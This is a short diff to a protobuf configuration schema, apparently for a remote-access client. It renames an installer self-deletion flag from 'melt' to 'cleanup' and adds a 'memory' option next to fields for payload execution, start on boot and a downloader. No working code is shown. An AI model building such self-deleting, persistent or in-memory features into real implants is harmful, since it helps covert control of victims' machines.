@@ -163,8 +163,8 @@ message NetworkConfig {
  * Configuration specific to payload execution.
  */
 message ExecutionConfig {
-	// Whether the initial installer should be deleted upon successful execution
-	bool melt = 1;
+	// Whether the client installer should be deleted upon successful execution
+	bool cleanup = 1;
 
 	// Whether the client should be automatically started on boot
 	bool auto = 2;
@@ -204,6 +204,7 @@ message MegaConfig {
 	AuthenticationConfig authentication = 4;
 
 	bool downloader = 5;
+	bool memory = 6;
 }
 
 /**
